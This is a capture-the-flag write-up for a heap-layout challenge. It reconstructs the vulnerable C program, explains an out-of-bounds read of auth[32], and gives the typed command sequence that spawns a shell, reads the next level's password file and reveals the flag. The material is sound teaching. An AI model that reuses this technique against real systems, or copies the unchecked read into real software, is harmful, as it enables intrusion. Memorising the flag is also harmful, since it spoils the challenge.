# level8 — logic + heap adjacency (no payload)

**Teaches:** reasoning about heap allocation layout; no shellcode, no overflow.

## 1. What the binary does
A loop that prints two pointers and accepts text commands (`auth `, `service`,
`reset`, `login`).

## 2. Reconstructed C
```c
char *auth = NULL;
char *service = NULL;
int main(void) {
    char buffer[128];
    while (1) {
        printf("%p, %p\n", auth, service);
        if (fgets(buffer, 128, stdin) == 0) break;
        if (strncmp(buffer, "auth ", 5) == 0) {
            auth = malloc(4); auth[0] = 0;
            if (strlen(buffer + 5) <= 30) strcpy(auth, buffer + 5);
        }
        if (strncmp(buffer, "reset", 5) == 0) free(auth);
        if (strncmp(buffer, "service", 6) == 0) service = strdup(buffer + 7);
        if (strncmp(buffer, "login", 5) == 0) {
            if (auth[32] != 0) system("/bin/sh");   // <-- the win condition
            else fwrite("Password:\n", 10, 1, stdout);
        }
    }
}
```

## 3. The vulnerability
`login` checks `auth[32]` — 32 bytes past a chunk that was only `malloc(4)`.
There is no bounds checking on that read. If **something non-zero** sits 32
bytes after `auth`, `system("/bin/sh")` runs. We control the heap layout with
the commands, so we place data there.

## 4. Memory map / the key observation
`auth = malloc(4)` returns e.g. `0x804a008`. The next allocation (`service =
strdup(...)`) lands 16 bytes later at `0x804a018` — right where `auth[16]`
would be. So `auth[32]` is 16 bytes into the **second** service chunk.
```
0x804a008  auth chunk        -> auth[0..15]
0x804a018  1st service chunk -> auth[16..31]
0x804a028  2nd service chunk -> auth[32..]   <- make this non-zero
```

## 5. Exploit (just type commands)
Run `./level8` and enter:
```
auth AAAA
service AAAAAAAAAAAAAAAA          <- fills to reach auth[32]
service AAAAAAAAAAAAAAAA
login
$ cat /home/user/level9/.pass
```
Alternatively one long `service` string of ≥16 chars also puts a non-zero byte
at `auth[32]`. Watch the printed addresses to confirm the 16-byte spacing.

**Why it works:** you arrange for the heap byte at `auth+32` to be non-zero, so
the `login` check passes and spawns a shell.

Flag → `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`
